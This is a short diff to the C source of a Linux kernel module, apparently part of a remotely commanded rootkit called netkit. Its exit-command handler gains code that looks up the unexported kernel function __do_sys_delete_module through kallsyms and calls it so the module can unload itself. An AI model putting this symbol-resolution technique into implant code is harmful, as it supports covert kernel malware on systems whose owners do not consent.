@@ -118,7 +118,13 @@ int cmd_handle_exit(const packet_req_t *packet, u8 **res_buf, size_t *res_buflen
 
     //sys_delete_module(netkit_module->name, 0);
     //syscall(__NR_delete_module, netkit_module->name, 0);
-    get_kallsyms();
+    typedef long (*_sym_type__sys_delete_module)(const char __user*, unsigned int);
+
+    _sym_type__sys_delete_module sys_delete_module = (_sym_type__sys_delete_module)get_kallsyms_lookup_name()("__do_sys_delete_module");
+
+    pr_err("[*] sys_delete_module: %lx\n", (unsigned long)sys_delete_module);
+
+    pr_err("[*] retv: %ld", sys_delete_module(netkit_module->name, 0));
     //void* sys_call_table = get_sys_call_table();
     //pr_err("[*] sys_call_table: %p\n", sys_call_table);
 
